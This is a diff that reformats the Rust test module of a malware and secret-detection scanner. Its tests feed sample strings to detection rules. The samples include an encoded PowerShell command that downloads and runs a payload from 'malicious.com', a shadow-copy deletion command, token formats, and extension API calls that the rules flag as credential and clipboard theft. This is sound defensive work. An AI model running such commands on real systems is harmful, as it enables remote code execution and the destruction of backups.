@@ -492,7 +492,16 @@ pub fn scan_directory_with_yara<P: AsRef<Path>>(
     let mut total_files = 0usize;
     let mut scanned_files = 0usize;
 
-    let skip_dirs: &[&str] = &[".git", "node_modules", "__pycache__", ".tox", ".eggs", "target", "venv", ".venv"];
+    let skip_dirs: &[&str] = &[
+        ".git",
+        "node_modules",
+        "__pycache__",
+        ".tox",
+        ".eggs",
+        "target",
+        "venv",
+        ".venv",
+    ];
 
     for entry in WalkDir::new(dir.as_ref()).into_iter().filter_entry(|e| {
         let name = e.file_name().to_string_lossy();
@@ -600,7 +609,10 @@ mod tests {
     #[test]
     fn test_telegram_rule() {
         let rules = build_rules();
-        let tg = rules.iter().find(|r| r.name == "Telegram Bot API Token").unwrap();
+        let tg = rules
+            .iter()
+            .find(|r| r.name == "Telegram Bot API Token")
+            .unwrap();
         assert!(tg.pattern.is_match("https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm/sendMessage"));
     }
 
@@ -615,7 +627,9 @@ mod tests {
     fn test_github_token_rule() {
         let rules = build_rules();
         let gh = rules.iter().find(|r| r.name == "GitHub Token").unwrap();
-        assert!(gh.pattern.is_match("ghp_abcdefghijklmnopqrstuvwxyz1234567890"));
+        assert!(gh
+            .pattern
+            .is_match("ghp_abcdefghijklmnopqrstuvwxyz1234567890"));
     }
 
     #[test]
@@ -638,7 +652,10 @@ mod tests {
     #[test]
     fn test_subprocess_rule() {
         let rules = build_rules();
-        let sp = rules.iter().find(|r| r.name == "subprocess (Python)").unwrap();
+        let sp = rules
+            .iter()
+            .find(|r| r.name == "subprocess (Python)")
+            .unwrap();
         assert!(sp.pattern.is_match("subprocess.Popen(['cmd.exe']"));
         assert!(sp.pattern.is_match("subprocess.call(['ls']"));
     }
@@ -646,50 +663,94 @@ mod tests {
     #[test]
     fn test_powershell_encoded() {
         let rules = build_rules();
-        let ps = rules.iter().find(|r| r.name == "PowerShell Encoded Command").unwrap();
+        let ps = rules
+            .iter()
+            .find(|r| r.name == "PowerShell Encoded Command")
+            .unwrap();
         assert!(ps.pattern.is_match("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA=="));
     }
 
     #[test]
     fn test_ransomware_rule() {
         let rules = build_rules();
-        let rw = rules.iter().find(|r| r.name == "Shadow Copy Deletion").unwrap();
+        let rw = rules
+            .iter()
+            .find(|r| r.name == "Shadow Copy Deletion")
+            .unwrap();
         assert!(rw.pattern.is_match("vssadmin delete shadows /all /quiet"));
     }
 
     #[test]
     fn test_vscode_extension_rules() {
         let rules = build_rules();
-        let auth = rules.iter().find(|r| r.name == "VS Code Session/Token Stealing").unwrap();
-        assert!(auth.pattern.is_match("const session = await vscode.authentication.getSession('github', ['repo']);"));
+        let auth = rules
+            .iter()
+            .find(|r| r.name == "VS Code Session/Token Stealing")
+            .unwrap();
+        assert!(auth.pattern.is_match(
+            "const session = await vscode.authentication.getSession('github', ['repo']);"
+        ));
 
-        let clip = rules.iter().find(|r| r.name == "VS Code Clipboard Harvesting").unwrap();
-        assert!(clip.pattern.is_match("const text = await vscode.env.clipboard.readText();"));
+        let clip = rules
+            .iter()
+            .find(|r| r.name == "VS Code Clipboard Harvesting")
+            .unwrap();
+        assert!(clip
+            .pattern
+            .is_match("const text = await vscode.env.clipboard.readText();"));
 
-        let fs = rules.iter().find(|r| r.name == "VS Code Workspace File Reading").unwrap();
-        assert!(fs.pattern.is_match("const file = await vscode.workspace.fs.readFile(uri);"));
+        let fs = rules
+            .iter()
+            .find(|r| r.name == "VS Code Workspace File Reading")
+            .unwrap();
+        assert!(fs
+            .pattern
+            .is_match("const file = await vscode.workspace.fs.readFile(uri);"));
 
-        let act = rules.iter().find(|r| r.name == "VS Code Wildcard Activation").unwrap();
-        assert!(act.pattern.is_match(r#""activationEvents": [ "*", "onCommand:myExt.start" ]"#));
+        let act = rules
+            .iter()
+            .find(|r| r.name == "VS Code Wildcard Activation")
+            .unwrap();
+        assert!(act
+            .pattern
+            .is_match(r#""activationEvents": [ "*", "onCommand:myExt.start" ]"#));
     }
 
     #[test]
     fn test_jetbrains_plugin_rules() {
         let rules = build_rules();
-        let cl = rules.iter().find(|r| r.name == "JetBrains Dynamic Classloading").unwrap();
-        assert!(cl.pattern.is_match("URLClassLoader loader = new URLClassLoader(urls);"));
+        let cl = rules
+            .iter()
+            .find(|r| r.name == "JetBrains Dynamic Classloading")
+            .unwrap();
+        assert!(cl
+            .pattern
+            .is_match("URLClassLoader loader = new URLClassLoader(urls);"));
 
-        let pe = rules.iter().find(|r| r.name == "JetBrains Process Execution").unwrap();
+        let pe = rules
+            .iter()
+            .find(|r| r.name == "JetBrains Process Execution")
+            .unwrap();
         assert!(pe.pattern.is_match("Runtime.getRuntime().exec(cmd);"));
     }
 
     #[test]
     fn test_browser_extension_rules() {
         let rules = build_rules();
-        let perm = rules.iter().find(|r| r.name == "Browser Extension Dangerous Permissions").unwrap();
-        assert!(perm.pattern.is_match(r#""permissions": ["<all_urls>", "storage"]"#));
+        let perm = rules
+            .iter()
+            .find(|r| r.name == "Browser Extension Dangerous Permissions")
+            .unwrap();
+        assert!(perm
+            .pattern
+            .is_match(r#""permissions": ["<all_urls>", "storage"]"#));
 
-        let eval = rules.iter().find(|r| r.name == "Browser Extension Dynamic Code Execution").unwrap();
-        assert!(eval.pattern.is_match("chrome.tabs.executeScript(tabId, { code: payload });"));
+        let eval = rules
+            .iter()
+            .find(|r| r.name == "Browser Extension Dynamic Code Execution")
+            .unwrap();
+        assert!(eval
+            .pattern
+            .is_match("chrome.tabs.executeScript(tabId, { code: payload });"));
     }
 }
